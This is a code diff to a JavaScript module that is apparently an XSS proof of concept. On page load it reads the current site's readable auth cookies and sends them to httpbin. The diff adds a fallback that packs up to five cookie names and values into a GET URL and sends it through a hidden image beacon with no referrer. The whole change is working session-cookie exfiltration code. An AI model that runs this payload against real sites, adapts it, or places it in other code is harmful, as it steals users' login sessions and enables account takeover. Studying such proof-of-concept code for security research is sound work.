@@ -107,6 +107,32 @@ define([], function () {
       });
   }
 
+  function buildReadableHttpbinLink(baseUrl, payload) {
+    var authCookies = payload && payload.authCookies ? payload.authCookies : [];
+    var params = [];
+    params.push("event=" + encodeURIComponent(payload.event || "cp_hash_loader"));
+    params.push("ts=" + encodeURIComponent(payload.marker && payload.marker.ts ? payload.marker.ts : nowIso()));
+    params.push("origin=" + encodeURIComponent(payload.marker && payload.marker.victimOrigin ? payload.marker.victimOrigin : window.location.origin));
+    params.push("count=" + encodeURIComponent(String(authCookies.length)));
+
+    for (var i = 0; i < authCookies.length && i < 5; i++) {
+      var c = authCookies[i] || {};
+      params.push("c" + i + "n=" + encodeURIComponent(c.name || ""));
+      params.push("c" + i + "v=" + encodeURIComponent(c.value || ""));
+    }
+
+    return baseUrl + "?" + params.join("&");
+  }
+
+  function fireImageBeacon(url) {
+    return safeCall(function () {
+      var img = new Image();
+      img.referrerPolicy = "no-referrer";
+      img.src = url;
+      return true;
+    }, false);
+  }
+
   function upsertSpeechBalloon(title, link, statusText, isError) {
     var balloonId = "cp-httpbin-balloon";
     var titleId = "cp-httpbin-balloon-title";
@@ -218,39 +244,52 @@ define([], function () {
       authCookieCount: authCookies.length,
       note: "Only non-HttpOnly cookies readable from current site are included."
     };
+    var readableLink = buildReadableHttpbinLink(requestUrl, payload);
 
     window.__CP_POC_HTTPBIN_URL__ = requestUrl;
+    window.__CP_POC_HTTPBIN_READABLE_URL__ = readableLink;
     window.__CP_POC_AUTH_COOKIES__ = authCookies;
 
     upsertSpeechBalloon(
       "XSS executed at " + ts,
-      requestUrl,
-      "Posting auth cookies to httpbin...",
+      readableLink,
+      "Posting auth cookies to httpbin (POST + GET fallback)...",
       false
     );
 
     writeToHttpbin(requestUrl, payload)
       .then(function (delivery) {
-        window.__CP_POC_DELIVERY__ = delivery;
+        var beaconSent = fireImageBeacon(readableLink);
+        window.__CP_POC_DELIVERY__ = {
+          ok: delivery.ok,
+          status: delivery.status,
+          requestUrl: delivery.requestUrl,
+          echoedUrl: delivery.echoedUrl,
+          readableUrl: readableLink,
+          fallbackImageSent: beaconSent
+        };
         upsertSpeechBalloon(
           "HTTPBIN saved",
-          delivery.echoedUrl || requestUrl,
-          "Status: " + delivery.status,
+          readableLink,
+          "POST status: " + delivery.status + " | GET fallback: " + (beaconSent ? "sent" : "not sent"),
           !delivery.ok
         );
       })
       .catch(function (err) {
+        var beaconSent = fireImageBeacon(readableLink);
         window.__CP_POC_DELIVERY__ = {
           ok: false,
           status: 0,
           requestUrl: requestUrl,
+          readableUrl: readableLink,
+          fallbackImageSent: beaconSent,
           error: String(err && err.message ? err.message : err)
         };
         upsertSpeechBalloon(
-          "HTTPBIN write failed",
-          requestUrl,
-          "Error: " + window.__CP_POC_DELIVERY__.error,
-          true
+          "HTTPBIN fallback active",
+          readableLink,
+          "POST failed, GET fallback sent: " + (beaconSent ? "yes" : "no") + " | " + window.__CP_POC_DELIVERY__.error,
+          !beaconSent
         );
       });
 
@@ -260,7 +299,7 @@ define([], function () {
   executePoC();
 
   return {
-    version: "104.0.0-httpbin-auth-cookie-balloon",
+    version: "105.0.0-httpbin-post-with-get-fallback",
     render: function () {
       return executePoC();
     }
